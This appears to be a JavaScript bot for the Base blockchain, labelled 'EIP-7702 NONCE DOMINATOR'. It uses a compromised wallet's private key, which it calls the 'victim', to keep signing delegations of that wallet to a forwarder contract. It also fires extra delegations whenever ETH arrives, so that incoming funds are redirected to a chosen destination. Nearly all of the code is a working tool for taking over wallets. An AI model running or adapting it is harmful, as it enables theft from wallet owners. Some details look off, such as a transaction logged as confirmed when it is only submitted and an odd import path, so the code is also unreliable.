import {
  createWalletClient,
  createPublicClient,
  http,
  webSocket,
  parseGwei,
  formatGwei,
  privateKeyToAccount,
  encodeFunctionData,
} from "viem";
import { base } from "viem/chains";
import dotenv from "dotenv";

dotenv.config();

/* ========================= CONFIG ========================= */
const QUICKNODE_RPC      = process.env.QUICKNODE_RPC;
const QUICKNODE_WS       = process.env.QUICKNODE_WS;
const SEQUENCER_RPC      = process.env.SEQUENCER_RPC || "https://mainnet-sequencer.base.org";
const SPONSOR_PK         = process.env.SPONSOR_PK;
const COMPROMISED_PK     = process.env.COMPROMISED_PK;
const FORWARDER_ADDRESS  = process.env.FORWARDER_ADDRESS;
const DESTINATION_ADDRESS= process.env.DESTINATION_ADDRESS;
const AUTH_EXECUTOR_ADDRESS = process.env.AUTH_EXECUTOR_ADDRESS;

const NONCE_JUMP_MIN     = parseInt(process.env.NONCE_JUMP_MIN || "30", 10);
const NONCE_JUMP_MAX     = parseInt(process.env.NONCE_JUMP_MAX || "80", 10);
const GAS_LIMIT          = parseInt(process.env.GAS_LIMIT || "1000000", 10);
const GWEI_MIN           = parseFloat(process.env.GWEI_MIN || "0.001");
const GWEI_MAX           = parseFloat(process.env.GWEI_MAX || "0.004");
const FIRE_INTERVAL_MS   = parseInt(process.env.FIRE_INTERVAL_MS || "400", 10);
const DRY_RUN            = (process.env.DRY_RUN || "true").toLowerCase() === "true";
const TOKENS_TO_SWEEP    = (process.env.TOKENS_TO_SWEEP || "").split(",").map(s => s.trim()).filter(Boolean);

if (!SPONSOR_PK || !COMPROMISED_PK || !FORWARDER_ADDRESS || !DESTINATION_ADDRESS) {
  console.error("[FATAL] Missing required env: SPONSOR_PK, COMPROMISED_PK, FORWARDER_ADDRESS, DESTINATION_ADDRESS");
  process.exit(1);
}

/* ========================= ABIs ========================= */
const forwarderAbi = [
  { name: "DESTINATION", type: "function", stateMutability: "view", inputs: [], outputs: [{ type: "address" }] },
  { name: "initialize", type: "function", stateMutability: "nonpayable", inputs: [{ name: "_dest", type: "address" }], outputs: [] },
];

const authExecutorAbi = [
  { name: "setupForwarding", type: "function", stateMutability: "nonpayable", inputs: [{ name: "victim", type: "address" }, { name: "destination", type: "address" }], outputs: [] },
];

/* ========================= CLIENTS ========================= */
const httpTransport = http(QUICKNODE_RPC, { retryCount: 0, timeout: 15_000 });
const publicClient  = createPublicClient({ chain: base, transport: httpTransport });

const wsClient = QUICKNODE_WS
  ? createPublicClient({ chain: base, transport: webSocket(QUICKNODE_WS, { reconnect: true }) })
  : null;

const sponsorAccount     = privateKeyToAccount(`0x${SPONSOR_PK.replace(/^0x/, "")}`);
const compromisedAccount = privateKeyToAccount(`0x${COMPROMISED_PK.replace(/^0x/, "")}`);

const sponsorWallet = createWalletClient({
  account: sponsorAccount, chain: base, transport: httpTransport,
});
const compromisedWallet = createWalletClient({
  account: compromisedAccount, chain: base, transport: httpTransport,
});
const sequencerWallet = createWalletClient({
  account: sponsorAccount, chain: base,
  transport: http(SEQUENCER_RPC, { retryCount: 0, timeout: 15_000 }),
});

/* ========================= STATE ========================= */
let victimNonce     = 0n;
let sponsorNonce    = 0n;
let consecutiveErrs = 0;
let lastHeartbeat   = 0;
let isRunning       = true;
let totalAuthsSent  = 0n;
let totalTxsSent    = 0n;

/* ========================= HELPERS ========================= */
function log(msg, lvl = "info") {
  const ts = new Date().toISOString();
  const p = lvl === "error" ? "[ERR]" : lvl === "warn" ? "[WARN]" : "[INFO]";
  console.log(`${ts} ${p} ${msg}`);
}
function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randGwei() {
  const g = Math.random() * (GWEI_MAX - GWEI_MIN) + GWEI_MIN;
  return parseGwei(g.toFixed(9));
}

async function syncVictimNonce() {
  try {
    const chain = await publicClient.getTransactionCount({ address: compromisedAccount.address });
    const old = victimNonce;
    victimNonce = chain > victimNonce ? chain : victimNonce;
    if (victimNonce !== old) log(`Nonce sync: chain=${chain} local=${old} -> ${victimNonce}`);
  } catch (e) {
    log(`Nonce sync failed: ${e.message}`, "warn");
  }
}

async function checkDelegation() {
  try {
    const code = await publicClient.getBytecode({ address: compromisedAccount.address });
    const isDelegated = code && code.startsWith("0xef01");
    const delegatedTo = isDelegated ? `0x${code.slice(6, 46)}` : null;
    return { isDelegated, delegatedTo };
  } catch (e) {
    log(`Delegation check failed: ${e.message}`, "warn");
    return { isDelegated: false, delegatedTo: null };
  }
}

async function checkVictimInitialized() {
  try {
    const dest = await publicClient.readContract({
      address: compromisedAccount.address,
      abi: forwarderAbi,
      functionName: "DESTINATION",
    });
    return dest && dest !== "0x0000000000000000000000000000000000000000";
  } catch {
    return false;
  }
}

async function submitToBothRpcs(txRequest) {
  const promises = [
    (async () => {
      try { const hash = await sequencerWallet.sendTransaction(txRequest); return { rpc: "sequencer", hash }; }
      catch (e) { if (e.message?.includes("429") || e.message?.includes("rate")) log("Rate limited by SEQUENCER", "warn"); throw e; }
    })(),
    (async () => {
      try { const hash = await sponsorWallet.sendTransaction(txRequest); return { rpc: "quicknode", hash }; }
      catch (e) { if (e.message?.includes("429") || e.message?.includes("rate")) log("Rate limited by QUICKNODE", "warn"); throw e; }
    })(),
  ];
  return Promise.any(promises);
}

/* ========================= SETUP ========================= */
async function initializeVictimIfNeeded() {
  const initialized = await checkVictimInitialized();
  if (initialized) { log("Victim already initialized."); return; }

  if (!AUTH_EXECUTOR_ADDRESS) {
    log("Victim NOT initialized and AUTH_EXECUTOR_ADDRESS not set. Set it in .env to auto-init.", "warn");
    return;
  }
  if (DRY_RUN) {
    log("DRY RUN: would call AuthorizationExecutor.setupForwarding()");
    return;
  }
  try {
    // encodeFunctionData — type-safe, no hardcoded selector
    const calldata = encodeFunctionData({
      abi: authExecutorAbi,
      functionName: "setupForwarding",
      args: [compromisedAccount.address, DESTINATION_ADDRESS],
    });
    const hash = await sponsorWallet.sendTransaction({
      to: AUTH_EXECUTOR_ADDRESS,
      data: calldata,
      gas: 200000n,
      maxFeePerGas: randGwei(),
      maxPriorityFeePerGas: randGwei(),
    });
    log(`Initialization tx sent: ${hash}`);
    await publicClient.waitForTransactionReceipt({ hash });
    log("Victim initialized successfully.");
  } catch (e) {
    log(`Initialization failed: ${e.message}`, "error");
  }
}

/* ========================= FIRE ========================= */
async function fire() {
  const jumpSize = randInt(NONCE_JUMP_MIN, NONCE_JUMP_MAX);
  const gasPrice = randGwei();
  const startNonce = victimNonce;
  const endNonce   = victimNonce + BigInt(jumpSize) - 1n;

  log(`Firing ${jumpSize} auths | nonce ${startNonce}..${endNonce} | gas ${formatGwei(gasPrice)} gwei`);

  if (DRY_RUN) {
    log("DRY RUN — skipping chain submission");
    victimNonce += BigInt(jumpSize);
    totalAuthsSent += BigInt(jumpSize);
    return { hash: "dry-run", rpc: "none" };
  }

  // Parallel signing — much faster than sequential loop
  const authPromises = [];
  for (let i = 0; i < jumpSize; i++) {
    const nonce = Number(startNonce + BigInt(i));
    authPromises.push(
      compromisedWallet.signAuthorization({
        contractAddress: FORWARDER_ADDRESS,
        nonce: nonce,
        chainId: base.id,
      })
    );
  }
  const authorizationList = await Promise.all(authPromises);

  // Type-4 = EIP-1559 based → maxFeePerGas / maxPriorityFeePerGas, NOT gasPrice
  const txRequest = {
    to: compromisedAccount.address,
    value: 0n,
    gas: BigInt(GAS_LIMIT),
    maxFeePerGas: gasPrice,
    maxPriorityFeePerGas: gasPrice,
    authorizationList,
    nonce: sponsorNonce,
  };

  try {
    const result = await submitToBothRpcs(txRequest);
    log(`Tx confirmed on ${result.rpc} | hash: ${result.hash}`);
    victimNonce += BigInt(jumpSize);
    sponsorNonce += 1n;
    totalAuthsSent += BigInt(jumpSize);
    totalTxsSent += 1n;
    consecutiveErrs = 0;
    return result;
  } catch (e) {
    consecutiveErrs++;
    log(`Fire error (#${consecutiveErrs}): ${e.message}`, "error");
    if (consecutiveErrs >= 5) {
      log("5 consecutive errors — backing off 1s", "warn");
      await new Promise(r => setTimeout(r, 1000));
      consecutiveErrs = 0;
    }
    throw e;
  }
}

/* ========================= HEARTBEAT ========================= */
async function heartbeat() {
  const now = Date.now();
  if (now - lastHeartbeat < 10_000) return;
  lastHeartbeat = now;

  await syncVictimNonce();
  const { isDelegated, delegatedTo } = await checkDelegation();
  const status = isDelegated
    ? (delegatedTo?.toLowerCase() === FORWARDER_ADDRESS.toLowerCase() ? "OUR FORWARDER" : `UNKNOWN ${delegatedTo}`)
    : "NOT DELEGATED";

  log(`Heartbeat | victimNonce=${victimNonce} | sponsorNonce=${sponsorNonce} | totalAuths=${totalAuthsSent} | totalTxs=${totalTxsSent} | ${status}`);
}

/* ========================= WATCHERS ========================= */
function startWatchers() {
  if (!wsClient) { log("No WebSocket — skipping watchers"); return; }
  try {
    const unwatchBlocks = wsClient.watchBlocks({
      onBlock: async () => { await syncVictimNonce(); },
    });
    const unwatchPending = wsClient.watchPendingTransactions({
      onTransactions: async (txs) => {
        for (const tx of txs) {
          if (tx.to?.toLowerCase() === compromisedAccount.address.toLowerCase()) {
            log("INCOMING ETH to victim! Immediate fire triggered.");
            try { await fire(); } catch (e) { log(`Immediate fire failed: ${e.message}`, "error"); }
          }
        }
      },
    });
    log("WebSocket watchers active (blocks + pending)");
    process.on("SIGINT", () => {
      isRunning = false;
      unwatchBlocks();
      unwatchPending();
      process.exit(0);
    });
  } catch (e) {
    log(`Watcher setup failed: ${e.message}`, "warn");
  }
}

/* ========================= MAIN LOOP ========================= */
async function mainLoop() {
  log("=".repeat(60));
  log("EIP-7702 NONCE DOMINATOR — BEST BOT v3 (FIXED)");
  log(`Victim:      ${compromisedAccount.address}`);
  log(`Sponsor:     ${sponsorAccount.address}`);
  log(`Forwarder:   ${FORWARDER_ADDRESS}`);
  log(`Destination: ${DESTINATION_ADDRESS}`);
  log(`AuthExec:    ${AUTH_EXECUTOR_ADDRESS || "(not set)"}`);
  log(`DRY_RUN:     ${DRY_RUN}`);
  log("=".repeat(60));

  await syncVictimNonce();
  sponsorNonce = await publicClient.getTransactionCount({ address: sponsorAccount.address });
  log(`Sponsor start nonce: ${sponsorNonce}`);

  const { isDelegated, delegatedTo } = await checkDelegation();
  log(`Victim delegation: ${isDelegated ? delegatedTo : "none"}`);

  await initializeVictimIfNeeded();
  startWatchers();

  setInterval(async () => { await syncVictimNonce(); }, 2000);

  while (isRunning) {
    try {
      await heartbeat();
      await fire();
    } catch (e) {
      // already logged inside fire()
    }
    await new Promise(r => setTimeout(r, FIRE_INTERVAL_MS));
  }
}

mainLoop().catch(e => {
  log(`Fatal: ${e.message}`, "error");
  process.exit(1);
});
